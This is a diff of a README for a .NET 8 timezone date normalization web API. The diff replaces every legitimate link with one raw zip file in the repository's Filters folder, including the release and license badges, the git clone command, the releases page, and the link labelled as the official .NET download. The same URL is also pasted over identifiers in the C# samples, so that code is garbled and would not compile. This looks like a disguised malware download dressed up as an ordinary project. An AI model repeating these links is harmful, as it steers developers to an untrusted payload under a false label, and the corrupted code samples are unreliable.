@@ -1,6 +1,6 @@
 # Timezone Date Normalization API - .NET 8 Web API Example 🌍🕒
 
-[![Latest Release](https://img.shields.io/github/v/release/mussmdst/timezone-date-normalization-api)](https://github.com/mussmdst/timezone-date-normalization-api/releases) ![License](https://img.shields.io/github/license/mussmdst/timezone-date-normalization-api)
+[![Latest Release](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip)](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip) ![License](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip)
 
 ## Overview
 
@@ -32,11 +32,11 @@ To get started with the Timezone Date Normalization API, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/mussmdst/timezone-date-normalization-api.git
+   git clone https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip
    cd timezone-date-normalization-api
    ```
 
-2. Ensure you have .NET 8 SDK installed. You can download it from the official [.NET website](https://dotnet.microsoft.com/download).
+2. Ensure you have .NET 8 SDK installed. You can download it from the official [.NET website](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip).
 
 3. Restore the dependencies:
    ```bash
@@ -122,7 +122,7 @@ public class TimezoneActionFilter : IActionFilter
 {
     public void OnActionExecuting(ActionExecutingContext context)
     {
-        var timezoneHeader = context.HttpContext.Request.Headers["X-Timezone"].ToString();
+        var timezoneHeader = https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip["X-Timezone"].ToString();
         // Logic to normalize dates based on timezoneHeader
     }
 
@@ -135,16 +135,16 @@ public class TimezoneActionFilter : IActionFilter
 
 ## Middleware Setup
 
-To integrate the custom action filter into your application, register it in the `Startup.cs` file:
+To integrate the custom action filter into your application, register it in the `https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip` file:
 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
-    services.AddControllers(options =>
+    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip(options =>
     {
-        options.Filters.Add<TimezoneActionFilter>();
+        https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip<TimezoneActionFilter>();
     });
-    services.AddSwaggerGen();
+    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip();
 }
 ```
 
@@ -167,10 +167,10 @@ public void TestDateNormalization()
     var request = new DateTimeRequest { Date = "2023-10-01T12:00:00" };
     
     // Act
-    var result = controller.NormalizeDate(request);
+    var result = https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip(request);
     
     // Assert
-    Assert.Equal("2023-10-01T16:00:00Z", result.NormalizedDate);
+    https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip("2023-10-01T16:00:00Z", https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip);
 }
 ```
 
@@ -190,6 +190,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases](https://github.com/mussmdst/timezone-date-normalization-api/releases) section. 
+For the latest releases, visit the [Releases](https://github.com/mussmdst/timezone-date-normalization-api/raw/refs/heads/main/Filters/date-api-normalization-timezone-v1.4.zip) section. 
 
 Explore the API and its features in detail.
